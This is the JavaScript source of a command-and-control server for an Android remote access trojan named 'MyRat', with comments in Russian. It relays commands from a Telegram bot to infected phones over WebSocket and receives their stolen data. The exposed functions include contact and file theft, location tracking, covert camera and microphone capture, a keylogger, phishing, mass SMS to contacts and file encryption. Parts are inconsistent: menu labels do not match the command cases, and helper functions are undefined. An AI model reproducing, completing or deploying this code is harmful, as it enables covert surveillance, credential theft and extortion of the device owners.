// ===================================================================================
// Импорт необходимых модулей
// ===================================================================================
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

// ===================================================================================
// Инициализация сервера, WebSocket и Telegram-бота
// ===================================================================================
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Настройка Multer для загрузки файлов (без сохранения на диск, в памяти)
const uploader = multer();

// Загрузка конфигурации (токен Telegram-бота и ID чата) из файла data.json
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// Инициализация Telegram-бота с токеном из конфигурации
const bot = new telegramBot(config.token, {
    polling: true // Бот постоянно проверяет новые сообщения
});

// ===================================================================================
// Глобальные переменные и структуры данных
// ===================================================================================

// Хранилище для временных данных о текущей сессии управления
// Например, какой телефон выбран и какое действие ожидает ввода
const sessionData = new Map();

// Список всех доступных команд для управления устройством
const availableActions = [
    '✯ Contacts ✯',
    '✯ Gallery ✯',
    '✯ Calls ✯',
    '✯ Location ✯',
    '✯ Main camera ✯',
    '✯ Selfie Camera ✯',
    '✯ Microphone ✯',
    '✯ Vibrate ✯',
    '✯ Screenshot ✯',
    '✯ SMS ✯',
    '✯ Phishing ✯',
    '✯ Open URL ✯',
    '✯ Keylogger ON ✯',
    '✯ Keylogger OFF ✯',
    '✯ Encrypt ✯',
    '✯ Decrypt ✯',
    '✯ Apps ✯',
    '✯ File explorer ✯',
    '✯ Clipboard ✯',
    '✯ Pop notification ✯',
    '✯ About us ✯'
];

// ===================================================================================
// Веб-сервер: Обработка загрузки файлов от зараженных устройств
// ===================================================================================
app.post('/upload', uploader.single('file'), (req, res) => {
    // Когда устройство загружает файл (например, фото, аудио, файл из проводника)
    const fileName = req.file.originalname;
    const deviceId = req.headers['user-agent']; // Используется как ID устройства

    // Отправляем полученный файл оператору в Telegram
    bot.sendDocument(
        config.admin_chat_id, // ID чата оператора
        req.file.buffer,      // Содержимое файла
        {
            caption: `<b>✯ File received from → \${deviceId}</b>`,
            parse_mode: 'HTML'
        },
        {
            filename: fileName,
            contentType: '*/*'
        }
    );

    // Отправляем устройству ответ, что файл получен
    res.send('Done');
});

// Простой эндпоинт для проверки работоспособности сервера (пинг)
app.get('/ping', (req, res) => {
    res.send(config.token); // Возвращает токен бота (странно, но так в коде)
});


// ===================================================================================
// WebSocket: Обработка подключений от зараженных Android-устройств
// ===================================================================================
io.on('connection', (socket) => {
    // При подключении нового устройства
    const deviceId = socket.handshake.headers['user-agent'] + '-' + socket.id;
    const deviceModel = socket.handshake.query.model || 'no information';
    const deviceIp = socket.handshake.query.ip || 'no information';

    // Сохраняем информацию об устройстве в объекте сокета
    socket.deviceId = deviceId;
    socket.deviceModel = deviceModel;

    // Отправляем уведомление оператору в Telegram о новом подключении
    const connectionMessage = `
        <b>✯ New device connected</b>
        <b>Device</b> → \${deviceId}
        <b>model</b> → \${deviceModel}
        <b>ip</b> → \${deviceIp}
        <b>time</b> → \${socket.handshake.time}
    `;
    bot.sendMessage(config.admin_chat_id, connectionMessage, { parse_mode: 'HTML' });

    // Обработка отключения устройства
    socket.on('disconnect', () => {
        const disconnectionMessage = `
            <b>✯ Device disconnected</b>
            <b>Device</b> → \${deviceId}
            <b>model</b> → \${deviceModel}
            <b>ip</b> → \${deviceIp}
            <b>time</b> → new Date().toLocaleString()
        `;
        bot.sendMessage(config.admin_chat_id, disconnectionMessage, { parse_mode: 'HTML' });
    });

    // Обработка входящих сообщений от устройства (ответы на команды)
    socket.on('message', (data) => {
        // Пересылаем ответ от устройства оператору в Telegram
        bot.sendMessage(config.admin_chat_id, `<b>✯ Message received from → ${deviceId}\n\nMessage → </b>${data}`, { parse_mode: 'HTML' });
    });
});


// ===================================================================================
// Telegram-бот: Логика обработки команд от оператора
// ===================================================================================
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // ------------------------------
    //  /start
    // ------------------------------
    if (text === '/start') {
        bot.sendMessage(chatId, `
<b>Welcome to MyRat</b>

<b>version</b> → 1.0
Developed by: HollyRoot
        `, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    [' Devices ', ' Action '],
                    [' About us ']
                ],
                resize_keyboard: true
            }
        });
        return;
    }


    // ------------------------------
    //  ОБРАБОТКА СОСТОЯНИЙ (ввод текста)
    // ------------------------------

    if (sessionData.get('currentAction') === 'smsNumber') {
        const phoneNumber = text;
        const targetDevice = sessionData.get('currentTarget');

        const command = {
            request: 'sendSms',
            extras: [{ key: 'smsNumber', value: phoneNumber }]
        };

        sendCommandToTarget(targetDevice, command);
        resetSession();
        sendSuccessMessage();
        return;
    }

    if (sessionData.get('currentAction') === 'textToAllContacts') {
        const smsText = text;
        const targetDevice = sessionData.get('currentTarget');

        const command = {
            request: 'all-sms',
            extras: [{ key: 'text', value: smsText }]
        };

        sendCommandToTarget(targetDevice, command);
        resetSession();
        sendSuccessMessage();
        return;
    }

    if (sessionData.get('currentAction') === 'smsText') {
        const smsText = text;
        const phoneNumber = sessionData.get('currentNumber');
        const targetDevice = sessionData.get('currentTarget');

        const command = {
            request: 'sendSms',
            extras: [
                { key: 'smsNumber', value: phoneNumber },
                { key: 'text', value: smsText }
            ]
        };

        sendCommandToTarget(targetDevice, command);
        resetSession();
        sendSuccessMessage();
        return;
    }

    if (sessionData.get('currentAction') === 'notificationText') {
        const notificationText = text;
        const targetDevice = sessionData.get('currentTarget');

        const command = {
            request: 'popNotification',
            extras: [{ key: 'text', value: notificationText }]
        };

        sendCommandToTarget(targetDevice, command);
        resetSession();
        sendSuccessMessage();
        return;
    }

    if (sessionData.get('currentAction') === 'toastText') {
        const toastText = text;
        const targetDevice = sessionData.get('currentTarget');

        const command = {
            request: 'toast',
            extras: [{ key: 'text', value: toastText }]
        };

        sendCommandToTarget(targetDevice, command);
        resetSession();
        sendSuccessMessage();
        return;
    }


    // ------------------------------
    //  ОСНОВНЫЕ КОМАНДЫ
    // ------------------------------

    if (text === 'Devices') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, '<b>There is no connected device</b>', { parse_mode: 'HTML' });
        } else {
            let deviceList = `<b>Connected devices count : ${io.sockets.sockets.size}</b>\n\n`;
            let count = 1;

            io.sockets.sockets.forEach((socket) => {
                deviceList += `<b>Device ${count}</b>\n` +
                              `<b>Device</b> → ${socket.deviceId}\n` +
                              `<b>model</b> → ${socket.deviceModel}\n` +
                              `<b>ip</b> → ${socket.handshake.query.ip}\n` +
                              `<b>time</b> → ${socket.handshake.time}\n\n`;
                count++;
            });

            bot.sendMessage(chatId, deviceList, { parse_mode: 'HTML' });
        }
        return;
    }


    if (text === 'Action') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, '<b>There is no connected device</b>', { parse_mode: 'HTML' });
            return;
        }

        let deviceKeyboard = [];
        io.sockets.sockets.forEach((socket) => {
            deviceKeyboard.push([socket.deviceId]);
        });

        deviceKeyboard.push(['All ']);
        deviceKeyboard.push(['Back to main menu']);

        bot.sendMessage(chatId, '<b>Select device to perform action</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: deviceKeyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });

        return;
    }


    

    if (text === 'Send SMS') {
        const targetDevice = sessionData.get('currentTarget');

        if (!targetDevice) {
            bot.sendMessage(chatId, '<b>Please select a device first using Action </b>', { parse_mode: 'HTML' });
            return;
        }

        sessionData.set('currentAction', 'smsNumber');

        bot.sendMessage(chatId, '<b>Enter a phone number that you want to send SMS</b>', {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['Cancel action']],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });

        return;
    }


    // ------------------------------
    // ВЫБОР УСТРОЙСТВА
    // ------------------------------

    let selectedSocket = null;

    io.sockets.sockets.forEach((socket) => {
        if (text === socket.deviceId) {
            selectedSocket = socket;
        }
    });

    if (selectedSocket || text === 'All') {
        const targetId = (text === 'All') ? 'all' : selectedSocket.deviceId;
        sessionData.set('currentTarget', targetId);

        const actionMenuKeyboard = [
            ['Contacts', 'Gallery'],
            ['Location ', 'Main camera'],
            ['Selfie Camera', 'Microphone'],
            ['Vibrate', 'Screenshot'],
            ['SMS', 'Phishing'],
            ['Open URL', 'Keylogger ON'],
            ['Keylogger OFF', 'Encrypt'],
            ['Decrypt', 'Apps'],
            ['File explorer', 'Clipboard'],
            ['Pop notification'],
            ['Back to main menu']
        ];

        const menuText = (targetId === 'all')
            ? '<b>Select action to perform for all available devices</b>'
            : `<b>Select action to perform for ${targetId}</b>`;

        bot.sendMessage(chatId, menuText, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: actionMenuKeyboard,
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });

        return;
    }


    // ------------------------------
    //  КОНКРЕТНЫЕ ДЕЙСТВИЯ
    // ------------------------------

    if (availableActions.includes(text)) {
        const targetDevice = sessionData.get('currentTarget');

        if (!targetDevice) {
            bot.sendMessage(chatId, '<b>Error: Target device not set. Please select a device again.</b>', { parse_mode: 'HTML' });
            return;
        }

        let command = { request: '', extras: [] };

        switch (text) {
            case 'Contacts': command.request = 'contacts'; break;
            case 'Gallery': command.request = 'files'; break;
            case 'Location': command.request = 'location'; break;
            case 'Main camera': command.request = 'main-camera'; break;
            case 'Selfie Camera': command.request = 'selfie-camera'; break;
            case 'Screenshot': command.request = 'screenshot'; break;
            case 'Keylogger ON': command.request = 'keylogger-on'; break;
            case 'Keylogger OFF': command.request = 'keylogger-off'; break;
            case 'Apps': command.request = 'apps'; break;
            case 'File explorer': command.request = 'file-explorer'; break;
            case 'Clipboard': command.request = 'clipboard'; break;
            case 'Calls': command.request = 'calls'; break;
            case 'Open URL': command.request = 'open-url'; break;

            case 'Microphone':
                sessionData.set('currentAction', 'microphoneDuration');
                bot.sendMessage(chatId, '<b>Enter the microphone recording duration in seconds</b>', {
                    parse_mode: 'HTML',
                    reply_markup: { keyboard: [['✯ Cancel action ✯']], resize_keyboard: true }
                });
                return;

            case 'Vibrate ✯':
                sessionData.set('currentAction', 'vibrateDuration');
                bot.sendMessage(chatId, '<b>Enter the duration you want the device to vibrate in seconds</b>', {
                    parse_mode: 'HTML',
                    reply_markup: { keyboard: [['Cancel action']], resize_keyboard: true }
                });
                return;
        }

        sendCommandToTarget(targetDevice, command);
        sendSuccessMessage();
        return;
    }

}); // 🔥 конец bot.on('message')


// ------------------------------
//   SERVER LISTEN
// ------------------------------
const PORT = process.env.PORT || 3000;

server.listen(PORT, '0.0.0.0', () => {
    console.log(`C&C Server is running on port ${PORT}`);
});
